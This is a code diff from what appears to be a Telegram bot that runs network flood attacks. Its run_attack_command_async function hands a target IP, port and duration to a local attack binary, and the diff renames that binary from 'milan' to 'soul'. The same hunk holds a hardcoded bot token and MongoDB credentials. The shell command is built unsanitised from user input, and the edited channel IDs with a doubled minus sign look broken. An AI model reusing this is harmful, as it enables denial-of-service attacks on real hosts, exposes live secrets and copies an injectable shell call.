@@ -18,9 +18,9 @@ loop = asyncio.get_event_loop()
 
 TOKEN = '8154941852:AAHY76sy2cVu9NJNDySalHjLBkuFWOuG1r8'
 MONGO_URI = 'mongodb+srv://Bishal:Bishal@bishal.dffybpx.mongodb.net/?retryWrites=true&w=majority&appName=Bishal'
-FORWARD_CHANNEL_ID = -1002492468854
-CHANNEL_ID = -1002492468854
-error_channel_id = -1002492468854
+FORWARD_CHANNEL_ID = --1002492468854
+CHANNEL_ID = --1002492468854
+error_channel_id = --1002492468854
 
 logging.basicConfig(format='%(asctime)s - %(name)s - %(levelname)s - %(message)s', level=logging.INFO)
 
@@ -59,7 +59,7 @@ async def start_asyncio_loop():
         await asyncio.sleep(REQUEST_INTERVAL)
 
 async def run_attack_command_async(target_ip, target_port, duration):
-    process = await asyncio.create_subprocess_shell(f"./milan {target_ip} {target_port} {duration} 10")
+    process = await asyncio.create_subprocess_shell(f"./soul {target_ip} {target_port} {duration} 10")
     await process.communicate()
     bot.attack_in_progress = False
 
